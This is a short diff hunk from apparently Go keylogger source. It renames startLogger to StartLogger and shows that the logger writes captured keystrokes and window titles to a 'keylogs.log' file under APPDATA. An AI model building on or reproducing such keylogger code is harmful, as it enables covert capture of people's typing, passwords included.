@@ -14,7 +14,7 @@ var tmpPath string = os.Getenv("APPDATA") + "\\keylogs.log"
 var tmpKeylog string
 var tmpTitle string
 
-func startLogger(mode int) {
+func StartLogger(mode int) {
 	if mode == 0 { //Normal logger (everything until told to stop)
 		go windowLogger()
 		go keyLogger()
